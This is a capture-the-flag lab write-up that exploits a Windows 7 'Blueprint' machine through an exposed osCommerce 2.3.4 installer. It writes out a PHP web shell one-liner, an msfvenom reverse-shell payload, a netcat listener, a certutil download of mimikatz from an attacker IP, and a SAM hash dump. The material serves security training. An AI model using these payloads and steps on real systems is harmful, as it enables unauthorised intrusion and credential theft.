Welcome to this writeup i would walk you through the process of pwning this machine without using metasploit so let's begin.


we scan our target for open ports and running services.
```
nmap -sC -sV -p- -oN scan -T4 -P0 10.10.16.67 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 09:35 WAT
Warning: 10.10.16.67 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.16.67
Host is up (0.34s latency).
Not shown: 65515 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
80/tcp    open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open     ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open     microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open     mysql        MariaDB (unauthorized)
7976/tcp  filtered unknown
8080/tcp  open     http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
17161/tcp filtered unknown
18298/tcp filtered unknown
29066/tcp filtered unknown
38074/tcp filtered unknown
49152/tcp open     msrpc        Microsoft Windows RPC
49153/tcp open     msrpc        Microsoft Windows RPC
49154/tcp open     msrpc        Microsoft Windows RPC
49158/tcp open     msrpc        Microsoft Windows RPC
49159/tcp open     msrpc        Microsoft Windows RPC
49160/tcp open     msrpc        Microsoft Windows RPC
50256/tcp filtered unknown
56309/tcp filtered unknown
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:d6:05:7f:42:d9 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -13s, deviation: 1s, median: -14s
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-03-05T09:03:37+00:00
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-05T09:03:36
|_  start_date: 2024-03-05T08:25:16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1705.88 seconds
                                                                                        
```


let's begin enumeration.

##Enumeration

we have a couple of ports running on the target  so let's begin with those
 - 80 (http)
 - 135 (msrpc)
 - 139 (SMB)
 - 443 (https)
 - 445 (SMB)
 - 3306 (mySQL)
 - 8080 (http)

we can navigate to our web browser to check out the web server running on our target system.

so on port 80 we have a 404 error.

![image](/posts/res/BP1.png) 

meanwhile on port 443 we seem to have an application running on it 
![image](/posts/res/BP2.png) 


navigating through the following url ```https://10.10.113.71:8080/oscommerce-2.3.4/catalog/``` gives us an eshop website 


![image](/posts/res/BP3.png) 


so lets try to use gobuster to find and locate any hidden files or directories

```
command used: gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

```
![image](/posts/res/BP5.png) 

from our directory enumeration we were able to find the installation page for the application.

![image](/posts/res/BH4.png) 

from enumerating the web server we were able to get the following information 

```
the webserver runs **Oscommerce 2.3.4**
```

##Enumerating SMB 


we can try to enumerate smb for useful information by running a simple nmap script.

enumerating shares
```
command used: nmap -p 445 --script=smb-enum-shares <ip_address>
```

```
nmap -p 445 --script=smb-enum-shares 10.10.113.71
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-05 18:57 WAT
Nmap scan report for blue.thm (10.10.113.71)
Host is up (0.40s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.113.71\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.113.71\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.113.71\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: READ
|     Current user access: READ/WRITE
|   \\10.10.113.71\Users: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.10.113.71\Windows: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ

Nmap done: 1 IP address (1 host up) scanned in 85.51 seconds

```

now we enumerate users via smb user enum script
```
command used: nmap --script=smb-enum-users.nse -p445 blue.thm
```


![image](/posts/res/BP6.png) 

we can see that we have 3 users available on the target system:
 - Administrator
 - Guest
 - Lab
 now we can use smbclient to connect to our target.
 
```
 command used: smbclient //<TARGET_IP>/Users
```

![image](/posts/res/BP7.png) 

we can download files in the Users shares but cant in the Windows share because of root restrictions this means we cant access the SAM database.

##Gaining Foothold


we can simply search Oscommerce 2.3.4 in our web server to find a trusted exploit.

![image](/posts/res/BP8.png) 


 If an Admin has not removed the /install/ directory as advised from an osCommerce installation, it is possible  for an unauthenticated attacker to reinstall the page. The installation of osCommerce does not check if the page is already installed and does not attempt to do any authentication. It is possible for an attacker to directly execute the "install_4.php" script, which will create the config file for the installation. It is possible to inject PHP code into the config file and then simply executing the code by opening it.

so to use this exploit code we must setup a few things 

- create a PHP script asking for the system cmd: `<?php echo shell_exec($_GET["cmd"]); ?>` name it _shell.php_
- edit the exploit python file to include the victim IP and to download the _shell.php_ file from the attacker
- start a python server and run the exploit
- navigate to the _/install/includes_ and execute the new _configure.php_ file
- navigate to the PHP script and enter a command to test if it worked at _shell.php?cmd=whoami_
- If it worked: create a reverse shell with `msfvenom`
- change the path on _oscomm.py_ to the reverse shell
- run the python exploit
- navigate to _configure.php_ to upload the reverse shell
- navigate to _shell.php_ and execute the reverse shell: _shell.php?cmd=shell.exe_
- listen for shell

first we start by adding the php one liner code to a file called shell.php 
`<?php echo shell_exec($_GET["cmd"]); ?>`


![image](/posts/res/BP9.png) 

now we've successfully downloaded the shell.php file to the server let's inject command to confirm if tit gives us a web shell 
![image](/posts/res/BP10.png) 
command used: 
```
http://10.10.113.71:8080/oscommerce-2.3.4/catalog/install/includes/shell.php?cmd=whoami
```

![image](/posts/res/BP11.png) 

Cool!! we are already root. so now the next step is to gain a shell.
to do this we must create a shell with msfvenom and the apply the same technique we used earlier to send it over to the target machine.

from further enumeration by running the ***systeminfo*** command we can see that the system type is a x86 based PC so we would to use a x86 payload to get a reverse shell.

![image](/posts/res/sysinfo.png) 

Note: ensure to use a Stageless non-meterpreter payload!!

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```


![image](/posts/res/BP12.png) 

now we edit the exploit script to point over to ***shell.exe*** .
![image](/posts/res/BP13.png) 


![image](/posts/res/BP15.png) 


![image](/posts/res/BP14.png)

now we can set up our listener using netcat and execute it.

```
nc -lnvp 4455
```

```
execute using the following command: http://10.10.113.71:8080/oscommerce-2.3.4/catalog/install/includes/shell.php?cmd=shell-x86.exe
```

and now we have a shell.

![image](/posts/res/BP16.png) 

now we are asked to get the NTLM Hash of the user. to do this we must transfer mimikatz binary from our local machine unto the server.

in our kali machine we have mimikatz x86 binary available in the following file path 

```
/usr/share/windows-resources/mimikatz/Win32
```

all we need to do is copy the binary file over to our current working directory and then start a simple web server using python.

![image](/posts/res/BP17.png) 

now we start our python web server on our local machine using the following command:
```
python3 -m http.server 8081
```

on our target shell we can run the following command in the Temp directory to download the mimikatz binary from our local machine

```
certutil -urlcache -split -f http://10.9.215.120:8081/mimikatz.exe mimikatz.exe
```


![image](/posts/res/BP18.png) 

now we execute it by simply running:

```
mimikatz.exe
```

to dump hashes from the SAM database we use the following command:

```
lsadump::sam
```

![image](/posts/res/BP19.png) 

to crack the hash simply head over to crackstation and input the hash.

now to get root flag 
![image](/posts/res/BP20.png) 
